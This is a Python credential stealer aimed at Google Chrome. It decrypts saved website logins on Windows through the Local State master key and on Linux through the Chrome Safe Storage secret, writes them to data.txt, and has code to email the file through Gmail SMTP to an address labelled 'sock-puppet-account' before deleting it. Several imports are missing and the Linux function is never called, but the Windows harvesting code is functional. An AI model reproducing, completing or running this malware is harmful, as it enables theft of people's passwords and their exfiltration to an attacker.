•	from Cryptodome.Cipher import AES
import os
import json
import base64
import shutil
import sqlite3
import win32crypt
import yagmail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def get_MasterKey():   ##Getting Master_key from Local state
    try:
        local_state=open(os.path.expanduser("~")+os.sep+r"AppData\Local\Google\Chrome\User Data\Local State","r",encoding="UTF-8")
        key_state=local_state.read()
        key=json.loads(key_state)
        key=base64.b64decode(key["os_crypt"]["encrypted_key"])
        key=key[5:]
        Master_key=win32crypt.CryptUnprotectData(key)[1]
        return Master_key
    except Exception as e:
        pass

def decrypt(password,Master_key): #separating IV and password and decrypting data
    try:
        IV=password[3:15]
        data=password[15:]
        decrypt_object=AES.new(Master_key,AES.MODE_GCM,IV)
        decrypted_data=decrypt_object.decrypt(data)
        decrypted_data=decrypted_data[:-16] #Removing auth tag from payload
        return decrypted_data.decode()
    except:
        print("Chrome version < 80")




def main():

    Master_key=get_MasterKey()

    cred_db=os.path.expanduser("~")+os.sep+r"AppData\Local\Google\Chrome\User Data\default\Login data"

    shutil.copy2(cred_db,"temp.db")#making tem copy of data database bcoz databse is locked while chrome is running
    conn=sqlite3.connect("temp.db")
    cursor=conn.cursor()
    cursor.execute("SELECT action_url,username_value,password_value from logins")
    file = open("data.txt", 'a')
    for r in cursor.fetchall():
        website=r[0]
        username=r[1]
        encrypted_password=r[2]
        password=decrypt(encrypted_password,Master_key)
        data={'website':website,'username':username,'password':password}
        print(data)
        file.write(str(data)+'\n')

    file.close()
    conn.close()
    #os.remove("data.txt")#removing file
    os.remove("temp.db")#removing temperory database file

def Key_generate(key_pass): ##linux
    iterator = 1
    length = 16
    salt = b'saltysalt'
    key_pass = key_pass
    key = KDF.PBKDF2(key_pass, salt, length, iterator)
    return key


def get_password(key, enc_passwd): ##linux
    IV = b' ' * 16
    key = key
    encrypted = enc_passwd[3:]
    aes_object = AES.new(key, AES.MODE_CBC, IV)
    decrypt_password = aes_object.decrypt(encrypted)
    return decrypt_password.strip().decode()


def linux_chrome():
    bus = secretstorage.dbus_init()
    collection = secretstorage.get_default_collection(bus)
    # collection.unlck()
    for item in collection.get_all_items():
        if item.get_label() == 'Chrome Safe Storage':
            key_pass = item.get_secret()
    key = Key_generate(key_pass)
    dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
    shutil.copy(dbpath + "Login Data", 'LoginDatabase')
    conn = sqlite3.connect("LoginDatabase")
    cursor = conn.cursor()
    cursor.execute("""SELECT action_url,password_value,username_value FROM logins;""")
    for data in cursor.fetchall():
        url = data[0]
        password = get_password(key, data[1])
        username = data[2]
        print(f'url: {url} ,password: {password} ,username: {username} ')
    conn.close()
    os.remove("LoginDatabase")
    os.remove("temp.db")#removing temperory databse file
    yag_smtp_connection = yagmail.SMTP(user='mailaccount', password='mail-pass',
                                       host='smtp.gmail.com', port=465)

    email = 'sock-puppet-account'
    subject = 'Chrome Passwords'

    try:
        x = yag_smtp_connection.send(email, subject, attachments='data.txt')
        print("Email sent")
    except:
        print("Unable to send")

    os.remove("data.txt")


main()



